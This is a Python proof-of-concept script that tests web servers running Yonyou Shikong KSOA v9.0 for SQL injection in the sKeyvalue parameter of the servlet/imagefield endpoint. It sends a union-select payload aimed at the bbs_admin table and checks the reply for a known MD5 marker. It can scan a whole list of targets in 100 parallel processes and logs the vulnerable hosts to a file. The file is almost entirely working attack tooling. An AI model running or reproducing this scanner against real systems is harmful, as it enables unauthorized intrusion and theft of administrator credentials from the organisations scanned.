import requests,re,argparse,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

# 定义横幅
def banner():
    banner = '''
██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗      ██╗  ██╗███████╗ ██████╗  █████╗ 
╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║      ██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗
 ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║█████╗█████╔╝ ███████╗██║   ██║███████║
  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║╚════╝██╔═██╗ ╚════██║██║   ██║██╔══██║
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝      ██║  ██╗███████║╚██████╔╝██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝                                                                                                   
                                                            version:用友时空 KSOA v9.0

                                   
                                                                                                     
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
# 构造poc
def poc(target):
    payload = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+"
    url = target+payload
    header = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"

    }
    try:
        res1 = requests.get(url=url,headers=header,verify=False,timeout=10)
        if  '0x098f6bcd4621d373cade4e832627b4f6' in res1.text and res1.status_code == 200:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n') 
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()